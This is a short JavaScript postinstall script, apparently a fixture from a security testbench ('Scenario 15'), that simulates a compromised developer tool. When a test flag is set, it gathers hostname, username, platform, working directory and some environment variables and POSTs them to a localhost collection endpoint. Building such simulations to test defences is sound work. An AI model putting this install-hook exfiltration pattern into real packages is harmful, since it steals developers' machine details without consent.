/**
 * MALICIOUS DEV TOOL POSTINSTALL (Scenario 15)
 * Exfiltrates local “developer environment” info when TESTBENCH_MODE=enabled
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const os = require('os');

  const payload = {
    attack: 'developer-tool-compromise',
    stage: 'postinstall',
    tool: 'dev-tool',
    toolVersion: '9.9.9',
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    cwd: process.cwd(),
    env: {
      CI: process.env.CI,
      NODE_ENV: process.env.NODE_ENV
    }
  };

  const data = JSON.stringify(payload);

  const req = http.request(
    {
      hostname: 'localhost',
      port: 3015,
      path: '/collect',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    },
    () => {}
  );

  req.on('error', () => {});
  req.write(data);
  req.end();
}

